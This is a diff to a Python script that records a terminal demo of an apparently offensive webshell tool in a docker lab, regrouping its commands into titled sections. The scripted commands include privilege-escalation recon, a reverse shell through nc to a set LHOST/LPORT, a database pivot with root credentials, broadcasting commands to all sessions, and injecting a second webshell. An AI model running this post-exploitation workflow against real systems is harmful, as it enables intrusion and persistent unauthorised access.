@@ -26,33 +26,44 @@ WIDTH, HEIGHT = 104, 32
 # Two sessions are loaded from demo/webshells.json. NB: addresses match the docker
 # compose network (172.16.1.0/24) — the host gateway (.1) the target reverse-shells
 # back to, and the internal MySQL host `db`.
-CMDS = [
-    ("sessions", 2.0),                         # list loaded sessions (msf-style)
-    ("sysinfo", 2.0),                          # alias -> recon info
-    ("getuid", 1.6),                           # alias -> id (active session)
-    ("cd /var/www/html", 1.4),                 # state-aware prompt (cwd)
-    ("recon privesc", 2.2),                    # aggregate privesc enumeration
-    # --- datastore: set once, reused as defaults (no more prompts) ---
-    ("set LHOST 172.16.1.1", 0.7),
-    ("set LPORT 4444", 0.7),
-    ("set DB_ENGINE mysql", 0.7),
-    ("set DB_HOST db", 0.7),
-    ("set DB_USER root", 0.7),
-    ("set DB_PASS root", 0.7),
-    ("options", 2.0),                          # show the datastore
-    ("download /etc/hostname", 1.8),           # alias -> file get
-    ("pivot db", 2.2),                          # uses DB_* from the datastore, no prompt
-    ("databases", 1.6),                        #   nested DB sub-REPL
-    ("quit", 1.0),                             #   back to the main REPL
-    ("sessions -c id", 2.2),                   # broadcast a command to ALL sessions
-    # --- reverse shell using LHOST/LPORT from the datastore (no -i/-p needed) ---
-    ("pivot shell -m bash --listen --tool nc", 3.0),
-    ("id", 1.5),                               #   ...in the caught shell
-    ("uname -a", 1.7),
-    ("exit", 1.5),
-    ("sessions -i 1", 1.4),                    # switch the active session (prompt -> [1])
-    ("inject web --password s3cr3t", 2.2),     # inject a secondary webshell
-    ("quit", 1.8),                             # snapshot the session
+# Sections — each gets a titled banner card so a viewer can follow along.
+SECTIONS = [
+    ("Sessions & recon — manage many shells, one active", [
+        ("sessions", 2.0),                     # list loaded sessions (msf-style)
+        ("sysinfo", 2.0),                      # alias -> recon info
+        ("getuid", 1.6),                       # alias -> id (active session)
+        ("cd /var/www/html", 1.4),             # state-aware prompt (cwd)
+        ("recon privesc", 2.2),                # aggregate privesc enumeration
+    ]),
+    ("Datastore — set once, reused as defaults (no more prompts)", [
+        ("set LHOST 172.16.1.1", 0.7),
+        ("set LPORT 4444", 0.7),
+        ("set DB_ENGINE mysql", 0.7),
+        ("set DB_HOST db", 0.7),
+        ("set DB_USER root", 0.7),
+        ("set DB_PASS root", 0.7),
+        ("options", 2.2),                      # show the datastore
+    ]),
+    ("Files & database — aliases + the DB manager (uses DB_* above)", [
+        ("download /etc/hostname", 1.8),       # alias -> file get
+        ("pivot db", 2.2),                     # uses DB_* from the datastore, no prompt
+        ("databases", 1.6),                    #   nested DB sub-REPL
+        ("quit", 1.0),                         #   back to the main REPL
+    ]),
+    ("Broadcast — run one command on every session", [
+        ("sessions -c id", 2.4),
+    ]),
+    ("Reverse shell — connects back via LHOST/LPORT from the datastore", [
+        ("pivot shell -m bash --listen --tool nc", 3.0),
+        ("id", 1.5),                           #   ...in the caught shell
+        ("uname -a", 1.7),
+        ("exit", 1.5),
+    ]),
+    ("Switch session & inject — drive session 1, drop a new shell", [
+        ("sessions -i 1", 1.6),                # switch active session (prompt -> [1])
+        ("inject web --password s3cr3t", 2.2),
+        ("quit", 1.8),                         # snapshot the session
+    ]),
 ]
 
 TYPE_DELAY = 0.05
@@ -93,13 +104,27 @@ def main() -> None:
                            data.decode("utf-8", "replace")])
         return True
 
+    def section_banner(title: str) -> None:
+        """Inject a styled chapter card into the recording (not a typed command)."""
+        bar = "─" * (WIDTH - 2)
+        text = (
+            "\r\n"
+            f"\x1b[38;5;39m{bar}\x1b[0m\r\n"
+            f"\x1b[1;38;5;231;48;5;25m  ▶  {title}  \x1b[0m\r\n"
+            f"\x1b[38;5;39m{bar}\x1b[0m\r\n\r\n"
+        )
+        events.append([round(time.monotonic() - start, 4), "o", text])
+        pump(1.8)
+
     pump(3.2)  # banner + connectivity check
-    for cmd, linger in CMDS:
-        for ch in cmd:
-            os.write(fd, ch.encode())
-            pump(TYPE_DELAY)
-        os.write(fd, b"\r")
-        pump(linger)
+    for title, cmds in SECTIONS:
+        section_banner(title)
+        for cmd, linger in cmds:
+            for ch in cmd:
+                os.write(fd, ch.encode())
+                pump(TYPE_DELAY)
+            os.write(fd, b"\r")
+            pump(linger)
     pump(1.5)
 
     with contextlib_suppress():
